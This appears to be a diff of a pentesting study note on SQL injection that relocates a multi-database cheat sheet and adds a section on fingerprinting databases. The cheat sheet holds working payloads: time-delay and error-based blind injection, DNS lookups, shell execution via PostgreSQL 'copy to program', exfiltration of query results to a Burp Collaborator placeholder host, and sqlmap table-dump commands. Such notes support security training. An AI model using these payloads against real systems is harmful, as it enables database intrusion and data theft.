@@ -6,314 +6,52 @@ order: 3
 
 SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries.
 
+# Examining the database
 
-# Cheat Sheet
+Some core features of the SQL language are implemented in the same way across popular database platforms, and so many ways of detecting and exploiting SQL injection vulnerabilities work identically on different types of database. 
 
-## String Concatenation
+You can potentially identify both the database type and version by injecting provider-specific queries to see if one works 
 
-We can concatenate together multiple strings to make a single strings. It also works to do a subquery
+The following are some queries to determine the database version for some popular database types: 
 
-* **Oracle**:
+| **Database Type** |        **Query**        |
+|:-----------------:|:-----------------------:|
+|    mssql, mysql   |     SELECT @@version    |
+|       oracle      | SELECT * FROM v$version |
+|     postgresql    |     SELECT version()    |
+
+
+## Listing the contents of the database
+
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database. 
+
+For example, you can query `information_schema.tables` to list the tables in the database: 
+
 ```
-'foo'||'bar'
-```
+SELECT * FROM information_schema.tables
 
-* **Microsoft**:
-```
-'foo'+'bar'
-```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
 
-* **PostgreSQL**:
-```
-'foo'||'bar'
-'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
-```
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 
-* **MySQL**:
-```
-'foo' 'bar'
-CONCAT('foo', 'bar')
-```
-
-> **Note**: It's important while concatenating to only retrieve one element.
->
-> `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
-
-## Substring
-
-We can extract a part of a string, from a specified offset with a specified length.
-
-* **Oracle**:
-```
-SUBSTR('foobar', 4, 2)
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
 ```
 
-* **Microsoft**:
-```
-SUBSTRING('foobar', 4, 2)
-```
+### Listing contents of an Oracle database
 
-* **PostgreSQL**:
-```
-SUBSTRING('foobar', 4, 2)
-```
+On Oracle, you can find the same information as follows: 
 
-* **MySQL**:
-```
-SUBSTRING('foobar', 4, 2)
-```
-
-## Comments
-
-We can use comment to truncate a query and remove the portion of the original query that follows our input.
-
-* **Oracle**:
-```
---comment
-```
-
-* **Microsoft**:
-```
---comment
-/*comment*/
-```
-
-* **PostgreSQL**:
-```
---comment
-/*comment*/
-```
-
-* **MySQL**:
-```
-#comment
--- comment (space included)
-/*comment*/
-```
-
-## Database Version
-
-* **Oracle**:
-```
-SELECT banner FROM v$version
-SELECT version FROM v$instance
-```
-
-* **Microsoft**:
-```
-SELECT @@version
-```
-
-* **PostgreSQL**:
-```
-SELECT version()
-```
-
-* **MySQL**:
-```
-SELECT @@version
-```
-
-## Database Contents
-
-* **Oracle**:
 ```
 SELECT * FROM all_tables
-SELECT * FROM all_tab_columns WHERE table_name = 'TABLENAME'
-```
-
-* **Microsoft**:
-```
-SELECT * FROM information_schema.tables
-SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
-```
-
-* **PostgreSQL**:
-```
-SELECT * FROM information_schema.tables
-SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
-```
-
-* **MySQL**:
-```
-SELECT * FROM information_schema.tables
-SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
-```
-
-## Conditional Errors
-
-* **Oracle**:
-```
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual 
-```
-
-* **Microsoft**:
-```
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END 
-```
-
-* **PostgreSQL**:
-```
-1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END)
-```
-
-* **MySQL**:
-```
-SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
-```
-
-## Stacked Queries
-
-We can use batched or stacked queries to execute multipels queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. This technique is primarily of use in realtion to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error or time delay.
-
-* **Oracle**:
-```
-Does not support batched queries
-```
-
-* **Microsoft**:
-```
-QUERY 1; QUERY 2
-```
-
-* **PostgreSQL**:
-```
-QUERY 1; QUERY 2
-```
-
-* **MySQL**:
-```
-QUERY 1; QUERY 2
-```
-
-## Time Delays
-
-* **Oracle**:
-```
-dbms_pipe.receive_message(('a'),10)
-```
-
-* **Microsoft**:
-```
-WAITFOR DELAY '0:0:10' 
-```
-
-* **PostgreSQL**:
-```
-SELECT pg_sleep(10)
-```
-
-* **MySQL**:
-```
-SELECT SLEEP(10) 
-```
-
-## Conditional Time Delays
-
-* **Oracle**:
-```
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
-```
-
-* **Microsoft**:
-```
-IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
-```
-
-* **PostgreSQL**:
-```
-SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END 
-```
-
-* **MySQL**:
-```
-SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
-```
-
-## DNS Lookup
-
-We can cause the database to perform a DNS lookup to an external domain.
-
-* **Oracle**: The following technique leverages an XXE vulnerability to trigger a DNS lookup. THe vulnerability has been patched but there are many unpatched Oracle installations in existence.
-```
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
-```
-
-The following payload works on fully patched oracle database but need elevated privileges.
-
-```
-SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') 
-```
-
-* **Microsoft**:
-```
-exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 
-```
-
-* **PostgreSQL**:
-```
-copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' 
-```
-
-* **MySQL**: Only on Windows.
-```
-LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
-SELECT  INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
-```
-
-## DNS Lookup with data exfiltration
-
-We can also use DNS lookups to exfiltrate data such as passwords or other fields of a table.
-
-* **Oracle**:
-```
-SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
-```
-
-* **Microsoft**:
-```
-declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
-```
-
-* **PostgreSQL**:
-```
-create OR replace function f() returns void as $$
-declare c text;
-declare p text;
-begin
-SELECT into p (SELECT YOUR-QUERY-HERE);
-c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
-execute c;
-END;
-$$ language plpgsql security definer;
-SELECT f(); 
-```
-
-* **MySQL**: Only on Windows.
-```
-SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' 
-```
-
-
-# Automatization with sqlmap
-
-```
-# Post
-sqlmap -r request.txt -p username
-
-# Get
-sqlmap -u "http://example.com/index.php?id=1" -p id
-
-# Crawl
-sqlmap -u http://example.com --dbms=mysql --crawl=3
-```
-
-> **Note:** `request.txt` is a request saved in BurpSuite.
-
-## Dumping a Table
-
-```
-sqlmap -r request.txt -p username -D database_name -T table_name --dump
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 ```
 
 # Union Attack
@@ -659,6 +397,316 @@ print()
 > **Note:** MD5 hash are hexadecimal with 33 character length.
 
 * [https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
+
+
+# Cheat Sheet
+
+## String Concatenation
+
+We can concatenate together multiple strings to make a single strings. It also works to do a subquery
+
+* **Oracle**:
+```
+'foo'||'bar'
+```
+
+* **Microsoft**:
+```
+'foo'+'bar'
+```
+
+* **PostgreSQL**:
+```
+'foo'||'bar'
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+```
+
+* **MySQL**:
+```
+'foo' 'bar'
+CONCAT('foo', 'bar')
+```
+
+> **Note**: It's important while concatenating to only retrieve one element.
+>
+> `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+
+## Substring
+
+We can extract a part of a string, from a specified offset with a specified length.
+
+* **Oracle**:
+```
+SUBSTR('foobar', 4, 2)
+```
+
+* **Microsoft**:
+```
+SUBSTRING('foobar', 4, 2)
+```
+
+* **PostgreSQL**:
+```
+SUBSTRING('foobar', 4, 2)
+```
+
+* **MySQL**:
+```
+SUBSTRING('foobar', 4, 2)
+```
+
+## Comments
+
+We can use comment to truncate a query and remove the portion of the original query that follows our input.
+
+* **Oracle**:
+```
+--comment
+```
+
+* **Microsoft**:
+```
+--comment
+/*comment*/
+```
+
+* **PostgreSQL**:
+```
+--comment
+/*comment*/
+```
+
+* **MySQL**:
+```
+#comment
+-- comment (space included)
+/*comment*/
+```
+
+## Database Version
+
+* **Oracle**:
+```
+SELECT banner FROM v$version
+SELECT version FROM v$instance
+```
+
+* **Microsoft**:
+```
+SELECT @@version
+```
+
+* **PostgreSQL**:
+```
+SELECT version()
+```
+
+* **MySQL**:
+```
+SELECT @@version
+```
+
+## Database Contents
+
+* **Oracle**:
+```
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLENAME'
+```
+
+* **Microsoft**:
+```
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+
+* **PostgreSQL**:
+```
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+
+* **MySQL**:
+```
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+
+## Conditional Errors
+
+* **Oracle**:
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual 
+```
+
+* **Microsoft**:
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END 
+```
+
+* **PostgreSQL**:
+```
+1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END)
+```
+
+* **MySQL**:
+```
+SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
+```
+
+## Stacked Queries
+
+We can use batched or stacked queries to execute multipels queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. This technique is primarily of use in realtion to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error or time delay.
+
+* **Oracle**:
+```
+Does not support batched queries
+```
+
+* **Microsoft**:
+```
+QUERY 1; QUERY 2
+```
+
+* **PostgreSQL**:
+```
+QUERY 1; QUERY 2
+```
+
+* **MySQL**:
+```
+QUERY 1; QUERY 2
+```
+
+## Time Delays
+
+* **Oracle**:
+```
+dbms_pipe.receive_message(('a'),10)
+```
+
+* **Microsoft**:
+```
+WAITFOR DELAY '0:0:10' 
+```
+
+* **PostgreSQL**:
+```
+SELECT pg_sleep(10)
+```
+
+* **MySQL**:
+```
+SELECT SLEEP(10) 
+```
+
+## Conditional Time Delays
+
+* **Oracle**:
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+```
+
+* **Microsoft**:
+```
+IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+```
+
+* **PostgreSQL**:
+```
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END 
+```
+
+* **MySQL**:
+```
+SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+```
+
+## DNS Lookup
+
+We can cause the database to perform a DNS lookup to an external domain.
+
+* **Oracle**: The following technique leverages an XXE vulnerability to trigger a DNS lookup. THe vulnerability has been patched but there are many unpatched Oracle installations in existence.
+```
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+
+The following payload works on fully patched oracle database but need elevated privileges.
+
+```
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') 
+```
+
+* **Microsoft**:
+```
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 
+```
+
+* **PostgreSQL**:
+```
+copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' 
+```
+
+* **MySQL**: Only on Windows.
+```
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT  INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+```
+
+## DNS Lookup with data exfiltration
+
+We can also use DNS lookups to exfiltrate data such as passwords or other fields of a table.
+
+* **Oracle**:
+```
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+
+* **Microsoft**:
+```
+declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+```
+
+* **PostgreSQL**:
+```
+create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f(); 
+```
+
+* **MySQL**: Only on Windows.
+```
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' 
+```
+
+
+# Automatization with sqlmap
+
+```
+# Post
+sqlmap -r request.txt -p username
+
+# Get
+sqlmap -u "http://example.com/index.php?id=1" -p id
+
+# Crawl
+sqlmap -u http://example.com --dbms=mysql --crawl=3
+```
+
+> **Note:** `request.txt` is a request saved in BurpSuite.
+
+## Dumping a Table
+
+```
+sqlmap -r request.txt -p username -D database_name -T table_name --dump
+```
 
 # References
 
